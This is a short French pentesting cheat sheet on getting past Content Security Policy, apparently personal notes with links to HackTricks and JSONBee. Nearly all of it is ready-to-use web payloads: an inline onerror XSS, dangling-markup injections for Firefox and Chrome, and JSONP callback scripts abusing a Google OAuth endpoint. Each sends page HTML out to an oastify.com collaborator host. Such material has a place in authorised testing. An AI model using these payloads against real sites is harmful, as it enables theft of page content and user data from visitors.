# Contournement de CSP 

Voir notamment : 

- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
- https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy



## Inline code

```
<img src=x onerror="document.location=`//cm2n64j7ys2wvkbrdz1x8epga7gy4pvdk.oastify.com?c=${btoa(document.body.innerHTML)}`">
```



## Dangling Markup

### Firefox

```
http://site.com//page?param_vuln=<link rel="prefetch" href='https://cm2n64j7ys2wvkbrdz1x8epga7gy4pvdk.oastify.com?
http://site.com/page?param_vuln=<meta http-equiv="refresh" content='0;URL=https://cm2n64j7ys2wvkbrdz1x8epga7gy4pvdk.oastify.com?x=
```

### Chrome

```
http://site.com//page?param_vuln=<table background='//cm2n64j7ys2wvkbrdz1x8epga7gy4pvdk.oastify.com?
http://site.com//page?param_vuln=<body background='http://cm2n64j7ys2wvkbrdz1x8epga7gy4pvdk.oastify.com/?
```



## JSONP 

Cas de figure d'un CSP autorisant des domaines de type Google, Twitter, Facebook, etc. 

Blocage de quelques fonctions comme eval() ou fetch() et nécessité de faire charger la page en entier avant l'exécution du payload.

Voir : 

- https://github.com/zigoo0/JSONBee

- https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt



```
curl -vvI

http://site.com//page?param_vuln="><script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)></script>

http://site.com//page?param_vuln="><script src=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(`https://bydmi3v6arev7jnqpydwkd1fm6sxg14q.oastify.com?x=${encodeURIComponent(document.documentElement.outerHTML)}`)></script>

http://site.com//page?param_vuln="><script defer src=https://accounts.google.com/o/oauth2/revoke?callback=window.location.replace(`https://bydmi3v6arev7jnqpydwkd1fm6sxg14q.oastify.com?x=${encodeURIComponent(document.documentElement.outerHTML)}`)></script>
```

